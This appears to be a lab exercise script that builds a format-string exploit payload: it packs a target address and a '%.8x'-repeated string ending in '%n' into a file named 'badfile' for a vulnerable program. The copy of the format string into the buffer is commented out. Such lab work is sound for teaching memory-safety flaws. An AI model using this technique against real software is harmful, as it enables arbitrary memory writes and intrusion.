#!/usr/bin/python3
import sys

# The program takes the address of target variable from
# the command line
target_var_addr = int(sys.argv[1], 16)

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
# number  = 0xbfffeeee
# content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
# content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
# s = "%.8x"*12 + "%n"

# The line shows how to store the string s at offset 8
# fmt  = (s).encode('latin-1')
# content[8:8+len(fmt)] = fmt

content[0:4] = (target_var_addr).to_bytes(4,byteorder='little')
#s = ("%16376u%n").encode('latin-1');
str = "%.8x"*22 + ".%n"
s = (str).encode('latin-1');
#content[4:4+len(s)] = s
print(content)
# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
